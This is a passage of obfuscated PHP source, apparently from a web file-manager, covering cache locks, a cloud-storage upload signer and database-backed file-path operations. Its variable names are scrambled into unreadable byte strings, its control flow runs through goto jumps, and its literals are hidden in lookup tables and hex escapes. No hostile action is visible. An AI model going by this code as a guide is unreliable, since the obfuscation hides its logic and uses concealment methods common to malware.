unlock($f¤¶¸ìÊ·ô) { return Cache::init()->remove($f¤¶¸ìÊ·ô); } } class CacheLockMemcached { public function lock($Eç¤ÍÒğĞ, $DÄ‹Äï¦¹‡ = 0) { $f¦„•¿î¯ƒ = Cache::init(); $aÃÄ…Á˜‹­ = microtime(!0) + $DÄ‹Äï¦¹‡; while (microtime(!0) < $aÃÄ…Á˜‹­) { $Dëˆˆïš‰ø = $f¦„•¿î¯ƒ->get($Eç¤ÍÒğĞ); if (!$Dëˆˆïš‰ø || $Dëˆˆïš‰ø < microtime(!0)) { $F¤İØ¯ÛŒÎ = $f¦„•¿î¯ƒ->handle->add($Eç¤ÍÒğĞ, $aÃÄ…Á˜‹­, $DÄ‹Äï¦¹‡); if ($F¤İØ¯ÛŒÎ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($c’„¹Û»Øî) { return Cache::init()->get($c’„¹Û»Øî); } public function unlock($aÃŠø—ºÈš) { return Cache::init()->remove($aÃŠø—ºÈš); } } class CacheLockDatabase { public function lock($cáˆ‡–Œ´Û, $Cé¹²ËÂ²Ó = 0) { $B•ÄÜ²¾­Ç = Model($_SERVER[ÈİÅ¿ÈÈ¥×][763]); $AšŠÆ–š¨ƒ = microtime(!0) + $Cé¹²ËÂ²Ó; while (microtime(!0) < $AšŠÆ–š¨ƒ) { $AåÑÊîêŒ  = $B•ÄÜ²¾­Ç->get($cáˆ‡–Œ´Û); if (!$AåÑÊîêŒ  || $AåÑÊîêŒ  < microtime(!0)) { $b¥°óèæ½š = $B•ÄÜ²¾­Ç->set($cáˆ‡–Œ´Û, $AšŠÆ–š¨ƒ); if ($b¥°óèæ½š) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($aŠ£Şë­Û„) { return Model($_SERVER[ÈİÅ¿ÈÈ¥×][763])->get($aŠ£Şë­Û„); } public function unlock($fŠÇË¹‚Í) { Model($_SERVER[ÈİÅ¿ÈÈ¥×][763])->remove($fŠÇË¹‚Í); } } goto a „á’–¬•; DìÍîİå²ù: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($aãñ²ÅÄ‰Ş) { parent::__construct($aãñ²ÅÄ‰Ş); $this->signatureVersion($_SERVER[ÈİÅ¿ÈÈ¥×][208]); } public function uploadFormData($EÛŞõºøÏ, $Eïœ¿·ª„™ = 3600) { goto eÂ–šß¦×; aÁìË’ì‚©: $dï äŸ Ğ— = sha1($eñåÂã™ƒ¥); $eÜæ´†¹ Š = hash_hmac($F—àˆÕç«¼[226], $dï äŸ Ğ—, $B³–ˆŒÙ¹Ò); $BÈõ£ø¾‰ = array($F—àˆÕç«¼[1154] => $bİ›µ‚˜ğ, $F—àˆÕç«¼[1158] => $fÓø’´Òõ¦, $F—àˆÕç«¼[1162] => base64_encode($eñåÂã™ƒ¥), $F—àˆÕç«¼[1159] => $añ‹·…ŸŒ, $F—àˆÕç«¼[1160] => $this->accessKey, $F—àˆÕç«¼[1163] => $Dî»ÈñœŸ˜, $F—àˆÕç«¼[1164] => $eÜæ´†¹ Š, $F—àˆÕç«¼[173] => $this->getHost()); goto a’ŞºÓ…ã; e•¦›­’†§: $fÓø’´Òõ¦ = $F—àˆÕç«¼[1150]; $d¼’ˆŞœ²¥ = gmdate($F—àˆÕç«¼[1151], time() + $Eïœ¿·ª„™); $Dî»ÈñœŸ˜ = (string) time() . $F—àˆÕç«¼[67] . (string) (time() + $Eïœ¿·ª„™); goto Fé÷ÎÏÂÄ; a’ŞºÓ…ã: return $BÈõ£ø¾‰; goto dñƒÜ÷ŒïÊ; Fé÷ÎÏÂÄ: $eñåÂã™ƒ¥ = array($F—àˆÕç«¼[1152] => $d¼’ˆŞœ²¥, $F—àˆÕç«¼[1153] => array(array($F—àˆÕç«¼[1154] => $bİ›µ‚˜ğ), array($F—àˆÕç«¼[1155] => $this->bucket), array($F—àˆÕç«¼[1156], $F—àˆÕç«¼[1157], $F—àˆÕç«¼[33]), array($F—àˆÕç«¼[1158] => $fÓø’´Òõ¦), array($F—àˆÕç«¼[1159] => $añ‹·…ŸŒ), array($F—àˆÕç«¼[1160] => $this->accessKey), array($F—àˆÕç«¼[1161] => $Dî»ÈñœŸ˜))); $eñåÂã™ƒ¥ = json_encode($eñåÂã™ƒ¥); $B³–ˆŒÙ¹Ò = hash_hmac($F—àˆÕç«¼[226], $Dî»ÈñœŸ˜, $this->secret); goto aÁìË’ì‚©; eÂ–šß¦×: $F—àˆÕç«¼ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bİ›µ‚˜ğ = $F—àˆÕç«¼[189]; $añ‹·…ŸŒ = $F—àˆÕç«¼[226]; goto e•¦›­’†§; dñƒÜ÷ŒïÊ: } public function fileOutLink($bàÊŠÕÁ†) { $f’ô²ãÛ‰ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (substr($bàÊŠÕÁ†, 0, 7) == $f’ô²ãÛ‰[1165]) { $bàÊŠÕÁ† = $f’ô²ãÛ‰[1166] . substr($bàÊŠÕÁ†, 7); } header($f’ô²ãÛ‰[156] . $bàÊŠÕÁ†); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($B®ˆ²‡ø) { $this->pathParse = $B®ˆ²‡ø; $this->model = Model($_SERVER[ÈİÅ¿ÈÈ¥×][1167]); } public function getPath($e¬œÑÁÖï¿) { return trim($e¬œÑÁÖï¿, $_SERVER[ÈİÅ¿ÈÈ¥×][8]); } public function pathFather($AÒ¥Õõ’ğ) { $CšÃ—óèÌà = $this->parse($AÒ¥Õõ’ğ); $CšÃ—óèÌà = $this->infoSimple($AÒ¥Õõ’ğ); return $CšÃ—óèÌà ? $CšÃ—óèÌà[$_SERVER[ÈİÅ¿ÈÈ¥×][478]] : !1; } public function pathThis($F×ˆêªÖÜÎ) { $AŒõèĞÂˆ¶ = $this->infoSimple($F×ˆêªÖÜÎ); return $AŒõèĞÂˆ¶ ? $AŒõèĞÂˆ¶[$_SERVER[ÈİÅ¿ÈÈ¥×][28]] : !1; } public function getPathOuter($aË¯§´—©‚) { if (!$aË¯§´—©‚) { return $aË¯§´—©‚; } $cİ‡İ­– — = $this->parse($aË¯§´—©‚); return KodIO::make($cİ‡İ­– —[$_SERVER[ÈİÅ¿ÈÈ¥×][383]]); } public function copyFolderFromIO($a’‘†“Á—‘, $c¼ÚÍŒà…Ü, $C†¼İãó³Ú, $c¯õø‹É‚º, $E«ÔÄÔ–´) { $AÜ¡íê‡µ = $this->model->copyFolderFromIO($a’‘†“Á—‘, $c¼ÚÍŒà…Ü, $C†¼İãó³Ú, $c¯õø‹É‚º, $E«ÔÄÔ–´); return KodIO::make($AÜ¡íê‡µ); } public function isParentOf($Aë¸ËÙ‡Ö¢, $Dñ–‡°Šù) { return $this->model->isParentOf($Aë¸ËÙ‡Ö¢, $Dñ–‡°Šù); } public function mkfile($B‘Úê”ÏÉ, $cÅ„•Î«Ïä = '', $AÍ»âšÎçù = REPEAT_RENAME) { $cƒê»·¹å‡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÀãˆ‘Š­¨ = $this->parse($B‘Úê”ÏÉ); $B‘Úê”ÏÉ = $DÀãˆ‘Š­¨[$cƒê»·¹å‡[383]]; for ($e®Íî¡ºÔ… = 0; $e®Íî¡ºÔ… < count($DÀãˆ‘Š­¨[$cƒê»·¹å‡[1168]]); $e®Íî¡ºÔ…++) { $B´Ë¢„¯à‹ = $DÀãˆ‘Š­¨[$cƒê»·¹å‡[1168]][$e®Íî¡ºÔ…]; if ($e®Íî¡ºÔ… == count($DÀãˆ‘Š­¨[$cƒê»·¹å‡[1168]]) - 1) { $B‘Úê”ÏÉ = $this->model->mkfile($B‘Úê”ÏÉ, $B´Ë¢„¯à‹, $cÅ„•Î«Ïä, $AÍ»âšÎçù); break; } $B‘Úê”ÏÉ = $this->model->mkdir($B‘Úê”ÏÉ, $B´Ë¢„¯à‹, REPEAT_SKIP); } return $this->getPathOuter($B‘Úê”ÏÉ); } public function mkdir($e·Éğİğƒ, $eÑ¨®±Ï¬æ = REPEAT_SKIP) { $bÆ…ÛÆã =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B‘Ù½–ëÉ = $this->parse($e·Éğİğƒ); $e·Éğİğƒ = $B‘Ù½–ëÉ[$bÆ…ÛÆã[383]]; for ($D´ªĞöÎ¯ = 0; $D´ªĞöÎ¯ < count($B‘Ù½–ëÉ[$bÆ…ÛÆã[1168]]); $D´ªĞöÎ¯++) { $D™ËÀ™¥— = $B‘Ù½–ëÉ[$bÆ…ÛÆã[1168]][$D´ªĞöÎ¯]; $e·Éğİğƒ = $this->model->mkdir($e·Éğİğƒ, $D™ËÀ™¥—, $eÑ¨®±Ï¬æ); } return $this->getPathOuter($e·Éğİğƒ); } public function copyFile($C·©ÚË»ƒî, $ağÆ•ƒ³ìá, $a©ÖÜÂŠ¥Ê = REPEAT_REPLACE) { $aæì²Ñ°¬è =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aêÅ•íš•÷ = $this->parse($ağÆ•ƒ³ìá); $b¾ÄøáÛªõ = $this->model->copy($C·©ÚË»ƒî, $aêÅ•íš•÷[$aæì²Ñ°¬è[383]], $a©ÖÜÂŠ¥Ê, $aêÅ•íš•÷[$aæì²Ñ°¬è[75]]); return $b¾ÄøáÛªõ ? $this->getPathOuter($b¾ÄøáÛªõ) : !1; } public function moveFile($B¤ËÛéËàİ, $AÄ›©„Ñ—†, $CÀ‰ìØõ = REPEAT_REPLACE) { $aÊÅÑ™´½Ë =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¬¨¸•Ù–Ş = $this->parse($AÄ›©„Ñ—†); $Aœ´ÇÃá = $this->model->move($B¤ËÛéËàİ, $A¬¨¸•Ù–Ş[$aÊÅÑ™´½Ë[383]], $CÀ‰ìØõ, $A¬¨¸•Ù–Ş[$aÊÅÑ™´½Ë[75]]); return $Aœ´ÇÃá ? $this->getPathOuter($Aœ´ÇÃá) : !1; } public function copy($aë„ÍÖøŸ”, $b™¾¨ÒøóÎ, $a‡ƒ™í”ˆ = REPEAT_REPLACE) { $Eöë¾ç‘™¥ = $this->parse($b™¾¨ÒøóÎ); $fœÀÆ˜øëÒ = $this->model->copy($aë„ÍÖøŸ”, $Eöë¾ç‘™¥[$_SERVER[ÈİÅ¿ÈÈ¥×][383]], $a‡ƒ™í”ˆ); return $fœÀÆ˜øëÒ ? $this->getPathOuter($fœÀÆ˜øëÒ) : !1; } public function moveSameAllow() { } public function move($C„Æ×Ÿô, $d†ñàøÂÉ‚, $c‰ÃÅ–ØñÀ = REPEAT_REPLACE) { $b˜‘ªêŒ‚° = $this->parse($d†ñàøÂÉ‚); $D”†Ù©ê—® = $this->model->move($C„Æ×Ÿô, $b˜‘ªêŒ‚°[$_SERVER[ÈİÅ¿ÈÈ¥×][383]], $c‰ÃÅ–ØñÀ); return $D”†Ù©ê—® ? $this->getPathOuter($D”†Ù©ê—®) : !1; } public function remove($bÙ‘ºŒ¯¾ô, $a³›Ö¢íãÀ = true) { return $this->model->remove($bÙ‘ºŒ¯¾ô, $a³›Ö¢íãÀ); } public function rename($CÉî®Ãô¸ê, $dóÜŠ£¶ïÍ) { $fÛ‘ì×„èµ = $this->model->rename($CÉî®Ãô¸ê, $dóÜŠ£¶ïÍ); return $fÛ‘ì×„èµ ? $this->getPathOuter($CÉî®Ãô¸ê) : $fÛ‘ì×„èµ; } public function size($DéáÎÏ) { $E¸©å÷‘—Ì = $this->infoSimple($DéáÎÏ); return $E¸©å÷‘—Ì ? $E¸©å÷‘—Ì[$_SERVER[ÈİÅ¿ÈÈ¥×][77]] : 0; } public function infoSimple($e¼â”´–‘œ) { return $this->model->sourceInfo($e¼â”´–‘œ); } public function info($bíÚ²ñ•Ñ¬) { return $this->infoParse($bíÚ²ñ•Ñ¬); } public function infoAuth($CË©·Ï†îĞ) { return $this->infoParse($CË©·Ï†îĞ, !1, !0); } public function infoWithChildren($b¡–öŸí’è) { return $this->infoParse($b¡–öŸí’è, !0); } protected function infoParse($AîùÖèŒ, $eé¨ÁÂ¦— = false, $c×ÖÑ÷Ë = false) { if (!$eé¨ÁÂ¦—) { return $this->model->pathInfo($AîùÖèŒ, $c×ÖÑ÷Ë); } return $this->model->pathInfoMore($AîùÖèŒ); } public function infoFull($Aö·ê™ÒåŸ) { $f„á•Î‘Íô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Få†ÙÀìˆ‰ = explode($f„á•Î‘Íô[8], $Aö·ê™ÒåŸ); $Cï®¹¥¹÷Î = implode($f„á•Î‘Íô[8], array_splice($Få†ÙÀìˆ‰, 1)); return $this->model->pathInfoByPath($Få†ÙÀìˆ‰[0], $Cï®¹¥¹÷Î); } public function hashSimple($D†Ï™‰ƒ×ï) { $a…±ÑÙ¾Èé =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d¤¢³¤³Ù = $this->infoWithChildren($D†Ï™‰ƒ×ï); return $d¤¢³¤³Ù[$a…±ÑÙ¾Èé[161]][$a…±ÑÙ¾Èé[168]]; } public function hashMd5($cÙŠ³óâ•) { $Dº¿˜÷´›© =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $F÷“„ï¡å = $this->infoWithChildren($cÙŠ³óâ•); return $F÷“„ï¡å[$Dº¿˜÷´›©[161]][$Dº¿˜÷´›©[167]]; } public function exist($E·¿Ì“Ò) { $AÅ„›ƒØ™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fé³†ÇŞÇ = $this->parse($E·¿Ì“Ò); if (!$fé³†ÇŞÇ[$AÅ„›ƒØ™[75]]) { return $this->isFile($E·¿Ì“Ò) || $this->isFolder($E·¿Ì“Ò); } $bÅã“ó“º = array($AÅ„›ƒØ™[384] => $fé³†ÇŞÇ[$AÅ„›ƒØ™[383]], $AÅ„›ƒØ™[28] => $fé³†ÇŞÇ[$AÅ„›ƒØ™[75]]); $DªâçÃ›¶Ê = $this->model->where($bÅã“ó“º)->find(); return $DªâçÃ›¶Ê ? !0 : !1; } public function isFile($cÓ¹¦›ù§¡) { $EĞÀÂ±± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AöÑøˆ÷ãÁ = $this->infoSimple($cÓ¹¦›ù§¡); return $AöÑøˆ÷ãÁ && $AöÑøˆ÷ãÁ[$EĞÀÂ±±[386]] == $EĞÀÂ±±[83] ? !1 : !0; } public function isFolder($cœ¬ò‘õğæ) { $e›Åˆî” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÒ´óëÂÛ¼ = $this->infoSimple($cœ¬ò‘õğæ); return $FÒ´óëÂÛ¼ && $FÒ´óëÂÛ¼[$e›Åˆî”[386]] == $e›Åˆî”[83] ? !0 : !1; } public function listPath($E¶Í­œŸöÂ, $b„î”¬òù£ = false) { $f’é†ÏŒ… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($E¶Í­œŸöÂ == $f’é†ÏŒ…[33]) { return !1; } $bâÒà¡˜ = array($f’é†ÏŒ…[384] => $E¶Í­œŸöÂ); if ($b„î”¬òù£) { return $this->model->listSource($bâÒà¡˜, -1); } return $this->model->listSource($bâÒà¡˜); } public function has($Aæ†ºù²³«, $d‚ñï¦›¾ = false, $Fä³²«ÒÑ = null) { $eî´”Äšµ± =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Côê¾èÇ‰á = $this->infoWithChildren($Aæ†ºù²³«); if ($d‚ñï¦›¾) { return array($eî´”Äšµ±[200] => $Côê¾èÇ‰á[$eî´”Äšµ±[200]], $eî´”Äšµ±[199] => $Côê¾èÇ‰á[$eî´”Äšµ±[199]]); } return $Fä³²«ÒÑ ? $Côê¾èÇ‰á[$eî´”Äšµ±[200]] : $Côê¾èÇ‰á[$eî´”Äšµ±[199]]; } public function listAll($B¨¢«‘©Ë) { $b•×¤ÂôÎŸ = IO::info($this->pathParse[$_SERVER[ÈİÅ¿ÈÈ¥×][75]]); if (!$b•×¤ÂôÎŸ) { return array(); } return $this->model->listAll($B¨¢«‘©Ë); } public function getContent($AßÈ·õô„) { return $this->model->getContent($AßÈ·õô„); } public function setContent($f¹»†è‚, $Eİƒïˆìğ‚ = '') { return $this->model->setContent($f¹»†è‚, $Eİƒïˆìğ‚); } public function fileSubstr($Cä¡ğ†Å , $fË»ãùÒÀ£, $EõœÔåÍÑ) { return $this->model->fileSubstr($Cä¡ğ†Å , $fË»ãùÒÀ£, $EõœÔåÍÑ); } public function download($f‰ø™½­©ã, $F‘Ã‰ŠØã = '') { $fÙà¾İ‡‰ = get_path_father($F‘Ã‰ŠØã); $EÄ‰ôæËˆß = get_path_this($F‘Ã‰ŠØã); $E¥ •ê¢… = $this->model->fileInfoGet($f‰ø™½­©ã); $d ¯ˆÜ—ãÌ = IO::copy($E¥ •ê¢…[$_SERVER[ÈİÅ¿ÈÈ¥×][75]], $fÙà¾İ‡‰, !1, $EÄ‰ôæËˆß); return $d ¯ˆÜ—ãÌ; } public function setModifyTime($bê¨Œ„‚²‚, $d™âˆ…Õ¡• = '') { $this->model->metaSet($bê¨Œ„‚²‚, $_SERVER[ÈİÅ¿ÈÈ¥×][1169], $d™âˆ…Õ¡•); } public function upload($aÏ¸˜ô¦†à, $c¨ÀñÀ¾ñ, $F†Ã³ÚÑŸÒ = false, $fé¿ğãİ© = REPEAT_REPLACE) { $FãÆÑ³Ä½Í =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eŠÁÁµ î = $this->parse($aÏ¸˜ô¦†à); $DğÇ®ƒ³á = $this->model->addFile($eŠÁÁµ î[$FãÆÑ³Ä½Í[383]], $c¨ÀñÀ¾ñ, $eŠÁÁµ î[$FãÆÑ³Ä½Í[75]], $F†Ã³ÚÑŸÒ, $fé¿ğãİ©); return $this->getPathOuter($DğÇ®ƒ³á); } public function uploadFileByID($C¸ ‡•ä›¡, $cØØ¯ĞÔæ, $Dé¦Š‰Ÿ—Î) { $FˆùÁ†ñ»² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¤æ£å…‘ = $this->parse($C¸ ‡•ä›¡); $B›ŞÕ—”¢ê = $this->model->addFileByFileID($c¤æ£å…‘[$FˆùÁ†ñ»²[383]], $cØØ¯ĞÔæ, $c¤æ£å…‘[$FˆùÁ†ñ»²[75]], $Dé¦Š‰Ÿ—Î); return $this->getPathOuter($B›ŞÕ—”¢ê); } public function addFileByRemote($bÌ«¢‡¶ñÈ, $Dá„ßÄÖÈÃ, $d¶šÛŸ÷…¨ = array(), $dÜ˜…‡¬‰ = '', $cØæ‡Ÿ§ãÑ) { $AÀ‘ö¼—÷ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bƒ  „‚î = $this->parse($bÌ«¢‡¶ñÈ); $dÜ˜…‡¬‰ = empty($dÜ˜…‡¬‰) ? $Bƒ  „‚î[$AÀ‘ö¼—÷[75]] : $dÜ˜…‡¬‰; $CÖÙ×‰„À = $this->model->addFileByRemote($Bƒ  „‚î[$AÀ‘ö¼—÷[383]], $Dá„ßÄÖÈÃ, $dÜ˜…‡¬‰, $d¶šÛŸ÷…¨, $cØæ‡Ÿ§ãÑ); return $this->getPathOuter($CÖÙ×‰„À); } public function uploadLink($E Á©†¹ªÈ, $e³‡±Íí° = 0) { $b”÷¸‡¹Š =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D™î”×«¹› = $this->parse($E Á©†¹ªÈ); $E Á©†¹ªÈ = Model($b”÷¸‡¹Š[560])->createFileName($D™î”×«¹›[$b”÷¸‡¹Š[75]]); $a™º¡à°İ = IO::uploadLink($E Á©†¹ªÈ, $e³‡±Íí°); return $a™º¡à°İ; } public function fileNameAuto($bÇ¬‚°ñåî, $B­‰…µĞ½, $eëÛø³ÍÊ = REPEAT_REPLACE, $d¡•æÎÍ¤ = false) { return $this->model->fileNameAuto($bÇ¬‚°ñåî, $B­‰…µĞ½, $eëÛø³ÍÊ, $d¡•æÎÍ¤); } public function fileNameExist($c§±ã½ï¯, $FÛ‹ùìùù) { return $this->model->fileNameExist($c§±ã½ï¯, $FÛ‹ùìùù); } protected function _fileOut($aÍ£Ğ‰ØÖË, $e‡·§ãßí‹ = false, $F¿ ÛĞŒÖ = false, $dÕã„¬óŸÒ = '', $CÒ‹ŞÂ•—¿ = false) { goto a¤»ÇÀÎ‰; a¤»ÇÀÎ‰: $D‡¢±×â²Ğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e¸‹Œôí¾‰ = $this->model->sourceInfo($aÍ£Ğ‰ØÖË); if ($e¸‹Œôí¾‰[$D‡¢±×â²Ğ[386]] == $D‡¢±×â²Ğ[83]) { header($D‡¢±×â²Ğ[1170]); die; } goto a ¹ƒÛÜÜÓ; eŒë‚ÅôŒ¤: if ($CÒ‹ŞÂ•—¿) { return IO::fileOutServer($f©¡œä—‹[$D‡¢±×â²Ğ[75]], $e‡·§ãßí‹, $d×½Ø¥‚ãÁ, $dÕã„¬óŸÒ); } IO::fileOut($f©¡œä—‹[$D‡¢±×â²Ğ[75]], $e‡·§ãßí‹, $d×½Ø¥‚ãÁ, $dÕã„¬óŸÒ); goto B¢ÂÂ‡´Ê; a ¹ƒÛÜÜÓ: $f©¡œä—‹ = $this->model->fileInfoGet($aÍ£Ğ‰ØÖË); $dÕã„¬óŸÒ = $f©¡œä—‹[$D‡¢±×â²Ğ[167]] ? $f©¡œä—‹[$D‡¢±×â²Ğ[167]] : $dÕã„¬óŸÒ; $d×½Ø¥‚ãÁ = isset($GLOBALS[$D‡¢±×â²Ğ[1171]]) ? $GLOBALS[$D‡¢±×â²Ğ[1171]] : $e¸‹Œôí¾‰[$D‡¢±×â²Ğ[28]]; goto eŒë‚ÅôŒ¤; B¢ÂÂ‡´Ê: } public function fileOut($Dä…¿…Ú¾³, $d®Ÿˆ·Ö¦ = false, $b¸¥â³Õß = false, $FÃ¡âºç‰¨ = '') { $this->_fileOut($Dä…¿…Ú¾³, $d®Ÿˆ·Ö¦, $b¸¥â³Õß, $FÃ¡âºç‰¨); } public function fileOutServer($aµèê‚ù±‰, $AÑÕ¶š›ÉØ = false, $EŸ¨ŸÈ»­† = false, $c‹¯£ì¹‹‰ = '') { $this->_fileOut($aµèê‚ù±‰, $AÑÕ¶š›ÉØ, $EŸ¨ŸÈ»­†, $c‹¯£ì¹‹‰, !0); } protected function _fileOutImage($a ¹ÂÎĞèª, $EÇ¦ìÜ…¶‰ = 250) { goto b«ëÑÇ™ùÒ; b«ëÑÇ™ùÒ: $BÔù±£¿„Å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b—¨¶­®†‰ = $this->model->pathInfo($a ¹ÂÎĞèª); if ($b—¨¶­®†‰[$BÔù±£¿„Å[386]] == $BÔù±£¿„Å[83]) { show_json($BÔù±£¿„Å[1172] . $a ¹ÂÎĞèª, !1); } goto b©ÒÙŠ´ÇÕ; b©ÒÙŠ´ÇÕ: $c “ƒíÍ¯ = $this->model->fileInfoGet($a ¹ÂÎĞèª); $c “ƒíÍ¯[$BÔù±£¿„Å[28]] = $b—¨¶­®†‰[$BÔù±£¿„Å[28]]; $c “ƒíÍ¯[$BÔù±£¿„Å[160]] = $b—¨¶­®†‰[$BÔù±£¿„Å[160]]; goto EÛŞ×Á­Ãµ; EÛŞ×Á­Ãµ: $GLOBALS[$BÔù±£¿„Å[1171]] = $c “ƒíÍ¯[$BÔù±£¿„Å[28]]; $GLOBALS[$BÔù±£¿„Å[159]] = $c “ƒíÍ¯; IO::fileOutImage($c “ƒíÍ¯[$BÔù±£¿„Å[75]], $EÇ¦ìÜ…¶‰); goto d‚İ“„£¬; d‚İ“„£¬: } public function fileOutImage($FÖ‘‚²ï¥, $f¸©’¥Æ›ö = 250) { $this->_fileOutImage($FÖ‘‚²ï¥, $f¸©’¥Æ›ö); } public function fileOutImageServer($DÃßÏÄ† È, $E‰š½ ÷ŸÁ = 250) { $this->_fileOutImage($DÃßÏÄ† È, $E‰š½ ÷ŸÁ); } public function link($AÊÒåâ‚´Â, $fË§Û‹ ù‰ = '') { $B–º™“„÷÷ = $this->model->fileInfoGet($AÊÒåâ‚´Â); return IO::link($B–º™“„÷÷[$_SERVER[ÈİÅ¿ÈÈ¥×][75]], $fË§Û‹ ù‰); } protected function parse($CŠ¼¢ßï·Å) { $Eå££òßºÓ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (strstr($CŠ¼¢ßï·Å, $Eå££òßºÓ[8]) === !1) { return array($Eå££òßºÓ[401] => intval($CŠ¼¢ßï·Å), $Eå££òßºÓ[75] => $Eå££òßºÓ[33], $Eå££òßºÓ[1168] => array()); } $eáË×õß² = explode($Eå££òßºÓ[8], trim($CŠ¼¢ßï·Å, $Eå££òßºÓ[8])); if (count($eáË×õß²) < 2) { show_tips($CŠ¼¢ßï·Å . $Eå££òßºÓ[1173]); } return array($Eå££òßºÓ[401] => intval($eáË×õß²[0]), $Eå££òßºÓ[75] => $eáË×õß²[1], $Eå££òßºÓ[1168] => array_slice($eáË×õß², 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($B’·ÒÌ¢ˆõ) { $this->pathParse = $B’·ÒÌ¢ˆõ; $this->model = Model($_SERVER[ÈİÅ¿ÈÈ¥×][1167]); } public function getPathOuter($b†œ¼àƒ¤½) { $D¹ëÚ­Ê² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$b†œ¼àƒ¤½) { return $b†œ¼àƒ¤½; } $A¸Á×‘Ş™ = $this->parse($b†œ¼àƒ¤½); return trim(KodIO::makeShare($this->pathParse[$D¹ëÚ­Ê²[383]], $A¸Á×‘Ş™[$D¹ëÚ­Ê²[383]]), $D¹ëÚ­Ê²[8]); } protected function infoParse($AÂ‰³™ĞôÖ, $cë’İšõš‰ = false, $AÆˆËîİà« = false) { $f‡Áöë³¥á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AäÜ‡¼‘Ø´ = $this->pathParse[$f‡Áöë³¥á[383]]; $BÖ²İƒ¥š‰ = trim($this->pathParse[$f‡Áöë³¥á[1028]], $f‡Áöë³¥á[8]); return Action($f‡Áöë³¥á[1174])->sharePathInfo($AäÜ‡¼‘Ø´, $BÖ²İƒ¥š‰); } public function infoFull($fï¦¼Ô¥—´) { $D‚”½ºêÈÅ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cİœˆ˜ôôà = explode($D‚”½ºêÈÅ[8], trim($fï¦¼Ô¥—´, $D‚”½ºêÈÅ[8])); if (count($cİœˆ˜ôôà) > 1) { $bÃâùÇº£¬ = implode($D‚”½ºêÈÅ[8], array_splice($cİœˆ˜ôôà, 1)); $bëŸì¢…¶å = $this->model->pathInfoByPath($cİœˆ˜ôôà[0], $bÃâùÇº£¬); if (!$bëŸì¢…¶å) { return !1; } $this->pathParse[$D‚”½ºêÈÅ[1028]] = $bëŸì¢…¶å[$D‚”½ºêÈÅ[385]]; } return $this->infoParse($fï¦¼Ô¥—´); } public function listAll($fŠé´¥…) { goto fÚ ãñŠğ; fÚ ãñŠğ: $f¹ÖÀæ­×È =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b¶Ÿ™•— = IO::info($this->pathParse[$f¹ÖÀæ­×È[75]]); if (!$b¶Ÿ™•—) { return array(); } goto e×Åô¿âäÕ; e×Åô¿âäÕ: $eÊ½¦•äº½ = $this->model->listAll($fŠé´¥…); $DîÁùËÛ—Ù = Model($f¹ÖÀæ­×È[552])->getInfo($b¶Ÿ™•—[$f¹ÖÀæ­×È[456]]); $dã¿†—‰¡Š = Action($f¹ÖÀæ­×È[1174]); goto b˜·Ç÷Æô; b˜·Ç÷Æô: foreach ($eÊ½¦•äº½ as &$f§’Ëß†ëà) { check_abort(); $f§’Ëß†ëà[$f¹ÖÀæ­×È[407]] = $dã¿†—‰¡Š->_shareItemeParse($f§’Ëß†ëà[$f¹ÖÀæ­×È[407]], $DîÁùËÛ—Ù); } unset($f§’Ëß†ëà); return $eÊ½¦•äº½; goto A¬ãÍö¼òœ; A¬ãÍö¼òœ: } } goto a»ŠËëò¦»; B×…õÁù : class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\141\x6d\x65" => "\x69\x6f\x5f\163\157\165\x72\x63\x65\137\x6d\x65\164\x61", "\x6d\x65\x74\141\x46\x69\x65\154\x64" => "\x73\x6f\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\151\146\171\124\151\155\x65", "\164\x69\155\x65", "\x69\156\x73\145\162\x74", "\x66\165\x6e\x63\164\x69\157\156"), array("\x63\x72\145\141\164\145\x54\151\155\145", "\164\151\x6d\x65", "\151\156\163\x65\x72\164", "\x66\165\156\x63\x74\x69\x6f\156"), array("\166\151\x65\x77\124\x69\x6d\x65", "\x74\x69\155\145", "\x69\156\x73\145\x72\164", "\146\165\156\x63\164\x69\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($F“œ„¦ƒå) { return $this->listSource(array($_SERVER[ÈİÅ¿ÈÈ¥×][384] => $F“œ„¦ƒå)); } public function typeName($b¹øÜ¤ëÒØ) { static $Cã¡»ŞŞ’ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\145\x6d", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\162\x6f\x75\x70"); return $Cã¡»ŞŞ’[$b¹øÜ¤ëÒØ . $_SERVER[ÈİÅ¿ÈÈ¥×][33]]; } public function sourceListInfo($AÍî•ÑİÃ, $C£¦†ÑóÂå = false) { goto BâïÄÁ‰‘; F¡“»«˜ÓŒ: if 